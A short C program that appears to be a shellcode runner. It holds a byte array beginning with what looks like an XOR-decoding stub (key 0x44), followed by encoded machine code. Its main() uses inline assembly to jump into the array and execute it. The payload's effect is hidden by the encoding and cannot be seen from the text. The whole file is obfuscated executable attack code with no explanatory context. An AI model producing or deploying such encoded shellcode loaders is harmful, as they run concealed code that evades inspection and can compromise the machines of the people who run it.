unsigned char hexData[189] = {
    0x83, 0xC0, 0x14, 0x33, 0xC9, 0x8A, 0x1C, 0x08, 0x80, 0xF3, 0x44, 0x88, 0x1C, 0x08, 0x41, 0x80,
    0xFB, 0x90, 0x75, 0xF1, 0xB8, 0x2C, 0x2E, 0x4E, 0x7C, 0x5A, 0x2C, 0x27, 0xCD, 0x95, 0x0B, 0x2C,
    0x76, 0x30, 0xD5, 0x48, 0xCF, 0xB0, 0xC9, 0x3A, 0xB0, 0x77, 0x9F, 0xF3, 0x40, 0x6F, 0xA7, 0x22,
    0xFF, 0x77, 0x76, 0x17, 0x2C, 0x31, 0x37, 0x21, 0x36, 0x10, 0x77, 0x96, 0x20, 0xCF, 0x1E, 0x74,
    0xCF, 0x0F, 0x48, 0xCF, 0x0D, 0x58, 0xCF, 0x4D, 0xCF, 0x2D, 0x4C, 0xE9, 0x79, 0x2E, 0x4E, 0x7C,
    0x5A, 0x31, 0x41, 0xD1, 0xBB, 0x13, 0xBC, 0xD1, 0x24, 0xCF, 0x01, 0x78, 0xCF, 0x08, 0x41, 0x3C,
    0x47, 0x89, 0xCF, 0x1D, 0x64, 0x47, 0x99, 0x77, 0xBB, 0x03, 0xCF, 0x70, 0xFF, 0x47, 0xB1, 0xDD,
    0x4B, 0xFA, 0x42, 0x7E, 0x80, 0x30, 0x4C, 0x85, 0x8E, 0x43, 0x47, 0x94, 0x02, 0xAF, 0xB5, 0x7F,
    0x10, 0x60, 0x58, 0x31, 0xA0, 0xCF, 0x1D, 0x60, 0x47, 0x99, 0x22, 0xCF, 0x78, 0x3F, 0xCF, 0x1D,
    0x58, 0x47, 0x99, 0x47, 0x68, 0xFF, 0xD1, 0x1B, 0xEF, 0x13, 0x25, 0x79, 0x2E, 0x4E, 0x7C, 0x5A,
    0x31, 0xED, 0x77, 0x9F, 0x17, 0x2C, 0x22, 0x22, 0x22, 0x22, 0x2C, 0x22, 0x22, 0x22, 0x22, 0xCF,
    0x80, 0x17, 0x14, 0x14, 0x17, 0xBB, 0x13, 0xB8, 0x17, 0xBB, 0x13, 0xBC, 0xD4 
};

void main()
{
	_asm{
		lea eax,hexData
		push eax
		ret
	}
}
